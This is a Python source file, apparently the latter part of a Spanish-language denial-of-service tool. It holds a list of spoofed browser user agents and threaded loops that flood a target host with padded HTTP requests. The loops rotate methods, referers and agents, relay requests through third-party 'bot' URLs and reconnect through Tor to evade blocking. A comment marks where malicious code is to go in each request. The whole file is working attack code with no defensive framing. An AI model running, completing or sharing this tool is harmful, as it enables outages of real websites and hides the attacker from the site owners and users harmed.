    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.29pre) Gecko/20130101 Camino/2.1.3pre (like Firefox/3.6.29pre)")
    uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; de; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
    uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en; rv:1.9.2.24) Gecko/20111114 Camino/2.1 (like Firefox/3.6.24)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en; rv:1.9.0.8pre) Gecko/2009022800 Camino/2.0b3pre")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en; rv:1.9.0.10pre) Gecko/2009041800 Camino/2.0b3pre (like Firefox/3.0.10pre)")
    uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; it; rv:1.9.0.19) Gecko/2010111021 Camino/2.0.6 (MultiLang) (like Firefox/3.0.19)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.0.19) Gecko/2010111021 Camino/2.0.6 (MultiLang) (like Firefox/3.0.19)")
    uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en; rv:1.9.0.19) Gecko/2010051911 Camino/2.0.3 (like Firefox/3.0.19)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; nl; rv:1.9.0.19) Gecko/2010051911 Camino/2.0.3 (MultiLang) (like Firefox/3.0.19)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.0.18) Gecko/2010021619 Camino/2.0.2 (like Firefox/3.0.18)")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.1) Gecko/20070117 Epiphany/2.16 BonEcho/2.0.0.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070222 BonEcho/2.0.0.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070220 BonEcho/2.0.0.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070217 BonEcho/2.0.0.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070215 BonEcho/2.0.0.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070115 BonEcho/2.0.0.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.1) Gecko/20070110 BonEcho/2.0.0.1")
    uagent.append("Mozilla/5.0 (Android; WOW64; Linux armv7l;rv:5.0) Gecko/20110603 Firefox/5.0 Fennec/5.0")
    uagent.append("Mozilla/5.0 (Android; Linux armv7l;rv:5.0) Gecko/20110603 Firefox/5.0 Fennec/5.0")
    uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0")
    uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110614 Firefox/5.0 Fennec/5.0")
    uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0")
    uagent.append("Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0b8pre) Gecko/20110328 Firefox/4.0b8pre Fennec/4.0b3pre")
    uagent.append("Opera/9.20 (Windows NT 6.0; U; en)")
    uagent.append("Opera/9.80 (Android; Opera Mini/7.6.35766/35.5706; U; en) Presto/2.8.119 Version/11.10")
    uagent.append("Opera/9.80 (Android; Opera Mini/7.5.33361/31.1350; U; en) Presto/2.8.119 Version/11.10")
    uagent.append("Opera/9.80 (Android; Opera Mini/7.29530/27.1407; U; en) Presto/2.8.119 Version/11.10")
    uagent.append("Opera/9.80 (iPhone; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10")
    uagent.append("Opera/9.80 (iPad; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10")
    uagent.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
    uagent.append("Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.0")    
    return(uagent)

def bot_reconextando(url):
    try:
        while True:            
            if asignando_nuevo_conf == "on" or asignando_nuevo_conf == "ON" or asignando_nuevo_conf == "On":
                print (tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + FG + SD + " " + asignando_nuevo_leng + "... " + SR)
            agente_seleccionado = random.choice(uagent)
            req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': agente_seleccionado}))
            puerto = str(port)            
            if agente_asignado_conf == "on" or agente_asignado_conf == "ON" or agente_asignado_conf == "On":
                print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + " " + nuevo_agente_leng + SR)
                print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + ix + " " + agente_seleccionado[:40] + "..." + SR)
            if reconectando_conf == "on" or reconectando_conf == "ON" or reconectando_conf == "On":
                print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + sg + " " + reconectando_leng + ": " + mm +  host + sg + ":" + mm + puerto + sg + " / " + mm + met + SR)			
            time.sleep(.1)
    except:
        time.sleep(.1)

def down_it(item):    
    
    try:
        while True:
            global met            
            if met == "Random":  
                mix_metodo()             
                met_1 = str(random.choice(mmetodo))                
            else:
                met_1 = str(met)                        
            k = ''
            for _ in range(1,random.randint(2,5)):
                k += random.choice(lis)
            k += str(random.randint(1,600)) + random.choice(lis) + random.choice(lis)
            for _ in range(1,random.randint(1,3)):
                k += random.choice(lis)
            j = ''                
            for x in range(0,random.randint(11,31)):
                j += random.choice(lis)
            if package_conf == "basic" or package_conf == "Basic" or package_conf == "BASIC":
                par = '.'
            elif package_conf == "normal" or package_conf == "Normal" or package_conf == "NORMAL":
                par = (k * random.randint(15,28)) + str(random.randint(1,600)) + '=' + (j * random.randint(200,650)) + str(random.randint(1,400)) + random.choice(lis) + random.choice(lis)
            else:
                par = (k * random.randint(30,50)) + str(random.randint(1,100000)) + '=' + (j * random.randint(500,1000)) + str(random.randint(1,10000)) + random.choice(lis) + random.choice(lis)            
            referer_url()
            web_referer = random.choice(referer)
            packet = str(met_1 + " / HTTP/1.1\r\nHost:  " + http + host + "\n\r\n User-Agent:  " + str(random.choice(uagent)) + "\r\n Referer:  " + web_referer + "\r\n" + data + "\r\nKeep-Alive:  timeout=" + str(random.randint(90,120)) + ", max=" + str(random.randint(300,1000)) + "\r\nContent-Length: {}\r\n\r\n {}".format(len(par),par) ).encode('utf-8') #en \r\n\r\n{} deve ir el codigo malicioso
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                         
            s.connect((host,int(port)))
            puerto = str(port)            
            if conectando_conf == "on" or conectando_conf == "ON" or conectando_conf == "On":
                print (tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + " " + conectando_cliente_leng + ": " + mm +  host + sg + ":" + mm + puerto + sg + " / " + mm + met_1 + SR)
            if s.sendto( packet, (host, int(port)) ):
                s.shutdown(1)
                if package_send_it_conf == "on" or package_send_it_conf == "ON" or package_send_it_conf == "On":
                    print (tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + pp + " -->" + ix + " " + paquete_enviado_leng + SR)
                time.sleep(.1)                 
                byte = str(len(packet))             
                if port == "80":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.SOCK_DGRAM  #socket.SOCK_STREAM
                    s.settimeout(timeout)
                    try:
                        s.connect((host,int(port)))
                        s.shutdown(socket.SHUT_RDWR)
                        print (tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + pp + " -->" + ix + " " + paquete_recepcionado_leng + pp + " <--" + ix + " OK.." + SR + gg + " | " + SR + ff + "Bytes: " + SR + jj + "{" + SR + byte +  jj + "}" + SR + gg + " | " + SR + ff + mm + met_1 + SR)                        
                        return True
                    except socket.timeout as e:                        
                        print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + pp + "-->" + nn + " " + paquete_timeout_leng + " !!! " + pp + "<--" + SR + gg + " | " + SR + ff + "Bytes: " + SR + jj + "{" + SR + byte +  jj + "}" + SR + gg + " | " + SR + ff + mm + met_1 + SR + gg + " | " + SR + jj + forzando_leng + "..." + SR)
                        if forzar_agente_conf == "on" or forzar_agente_conf == "ON" or forzar_agente_conf == "On":
                            print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + "Forzando Nuevo" + ": " + mm + uagent_leng + SR)
                        return False
                    except:
                        print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + pp + "-->" + nn + " " + paquete_bloqueado_leng + " !!! " + pp + "<--" + SR + gg + " | " + SR + ff + "Bytes: " + SR + jj + "{" + SR + byte +  jj + "}" + SR + gg + " | " + SR + ff + mm + met_1 + SR + gg + " | " + SR + jj + forzando_leng + "..." + SR)                        
                        if forzar_agente_conf == "on" or forzar_agente_conf == "ON" or forzar_agente_conf == "On":
                            print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + "Forzando Nuevo" + ": " + mm + uagent_leng + SR)
                        return False
                    finally:
                        s.close()
                elif port == "443":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.SOCK_DGRAM  #socket.SOCK_STREAM
                    s.settimeout(timeout)
                    try:
                        s.connect((host,int(port)))
                        s.shutdown(socket.SHUT_RDWR)
                        print (tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + pp + " -->" + ix + " " + paquete_recepcionado_leng + pp + " <--" + ix + " OK.." + SR + gg + " | " + SR + ff + "Bytes: " + SR + jj + "{" + SR + byte +  jj + "}" + SR + gg + " | " + SR + ff + mm + met_1 + SR)                        
                        return True
                    except socket.timeout as e:                        
                        print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + pp + "-->" + nn + " " + paquete_timeout_leng + " !!! " + pp + "<--" + SR + gg + " | " + SR + ff + "Bytes: " + SR + jj + "{" + SR + byte +  jj + "}" + SR + gg + " | " + SR + ff + mm + met_1 + SR + gg + " | " + SR + jj + forzando_leng + "..." + SR)
                        if forzar_agente_conf == "on" or forzar_agente_conf == "ON" or forzar_agente_conf == "On":
                            print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + "Forzando Nuevo" + ": " + mm + uagent_leng + SR)
                        return False
                    except:
                        print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + pp + "-->" + nn + " " + paquete_bloqueado_leng + " !!! " + pp + "<--" + SR + gg + " | " + SR + ff + "Bytes: " + SR + jj + "{" + SR + byte +  jj + "}" + SR + gg + " | " + SR + ff + mm + met_1 + SR + gg + " | " + SR + jj + forzando_leng + "..." + SR)                        
                        if forzar_agente_conf == "on" or forzar_agente_conf == "ON" or forzar_agente_conf == "On":
                            print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + "Forzando Nuevo" + ": " + mm + uagent_leng + SR)
                        return False
                    finally:
                        s.close()               
            else:
                s.shutdown(1)
                print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + pp + "-->" + nn + " " + paquete_no_enviado_leng + " !!!" + pp + "<--" + SR)
                time.sleep(.1)                
    except socket.timeout:
        print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + nn + " " + "ERROR 504 TimeOut" + " : " + mm + str(host) + nn + " " + caido_protegido_leng + SR)
        print(tt + "[" + SR + ss + "+" + SR + tt + "]" + SR + " " + hh + " " + para_terminar_leng + " " + nn + "[Ctrl + C] " + hh + o_leng + nn + " [Ctrl + Z]" + SR)                
        time.sleep(1)        
        print(tt + "[" + SR + ss + "+" + SR + tt + "]" + SR + " " + hh + forzar_identidad)        
        conec_tor()
        if nueva_ip_asignada_conf == "on" or nueva_ip_asignada_conf == "ON" or nueva_ip_asignada_conf == "On":
            print (tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + nueva_ip_asignada)        
        time.sleep(1)    
    except socket.error as e:
        print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + nn + " " + error500_leng + " : " + mm + str(host) + nn + " " + caido_protegido_leng + SR)
        print(tt + "[" + SR + ss + "+" + SR + tt + "]" + SR + " " + hh + " " + para_terminar_leng + " " + nn + "[Ctrl + C] " + hh + o_leng + nn + " [Ctrl + Z]" + SR)        
        print(tt + "[" + SR + ss + "+" + SR + tt + "]" + SR + " " + hh + forzar_identidad)        
        conec_tor()
        if nueva_ip_asignada_conf == "on" or nueva_ip_asignada_conf == "ON" or nueva_ip_asignada_conf == "On":
            print (tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + nueva_ip_asignada)        
        time.sleep(1)  

def dos():    
    while True:        
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():    
    while True:        
        item = w.get()        
        bot_reconextando(random.choice(bots) + http + host)        
        w.task_done()

def dos3():
	while True:
		item = m.get()
		mix_metodo(item)
		m.task_done()

global data
headers = open(headers_conf, "r")
data = headers.read()
headers.close()

q = Queue()
w = Queue()
m = Queue()

def selector():
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target = dos)
            t.daemon = True
            t.start()
            t2 = threading.Thread(target = dos2)
            if verif_host_conf == "on" or verif_host_conf == "ON" or verif_host_conf == "On":
                print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + verificando_leng + ": " + mm + host + hh + " : " + mm + str(port) + SR)
            t2.daemon = True
            t2.start()
        start = time.time()
        item = 0
        time.sleep(3)
        while True:
            if (item>1800):
                item=0
                time.sleep(.1)
            item = item + 1
            q.put(item)
            w.put(item)
            m.put(item)
        q.join()
        w.join()
        m.join()

def iniciando():    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.SOCK_DGRAM  #socket.SOCK_STREAM
        s.connect((host,int(port)))
        s.settimeout(1)
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + target_leng + ": " + mm + str(host) + SR)        
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + puerto2_leng + ": " + mm + str(port) + SR)        
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + clientes2_leng + ": " + mm + str(thr) + SR)        
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + metodo2_leng + ": " + mm + str(met) + SR)        
    except socket.error as e:
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + target_leng + ": " + mm + str(host) + SR)
        print(tt + "[" + SR + jj + "+" + SR + tt + "]" + SR + " " + hh + estado_leng + ": " + nn + "ERROR.. " + imp_hand_leng + SR)
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + puerto2_leng + ": " + mm + str(port) + SR)
        print(tt + "[" + SR + jj + "+" + SR + tt + "]" + SR + " " + hh + estado_leng + ": " + nn + "ERROR.. " + puerto_no_leng + ": " + str(host) + SR)        
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + qq + verifique_leng + SR)
        print(tt + "[" + SR + jj + "+" + SR + tt + "]" + SR + " " + qq + host_cerrado_leng + SR + "\n")
        time.sleep(1)
        sys.exit(0)

def ini(): 
    pre()    
    user_agent()    
    mix_metodo()    
    my_bots()    
    ipchecker_url()       
    time.sleep(1)
    conec_tor()
    time.sleep(.1)
    iniciando()
    
    if verif_host_conf == "off" or verif_host_conf == "OFF" or verif_host_conf == "Off":
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + verificando_leng + ": " + mm + host + hh + " : " + mm + str(port) + SR)    
    load = tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + ee + loading_leng + ": " + SR
    p_a = tt + "[" + SR   
    pw = SR + ff 
    car01 = load + p_a + "■□□□□□□□□□ ]" + pw + "  10%" + SR
    car02 = load + p_a + "■■□□□□□□□□ ]" + pw + "  20%" + SR
    car03 = load + p_a + "■■■□□□□□□□ ]" + pw + "  30%" + SR
    car04 = load + p_a + "■■■■□□□□□□ ]" + pw + "  40%" + SR
    car05 = load + p_a + "■■■■■□□□□□ ]" + pw + "  50%" + SR
    car06 = load + p_a + "■■■■■■□□□□ ]" + pw + "  60%" + SR
    car07 = load + p_a + "■■■■■■■□□□ ]" + pw + "  70%" + SR
    car08 = load + p_a + "■■■■■■■■□□ ]" + pw + "  80%" + SR
    car09 = load + p_a + "■■■■■■■■■□ ]" + pw + "  90%" + SR
    car10 = load + p_a + "■■■■■■■■■■ ]" + pw + " 100%\n" + SR
    animation = [car01, car02, car03, car04, car05, car06, car07, car08, car09, car10]    
    for i in range(len(animation)):        
        time.sleep(0.2)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()    
    selector()

if __name__ == '__main__':
    ini()
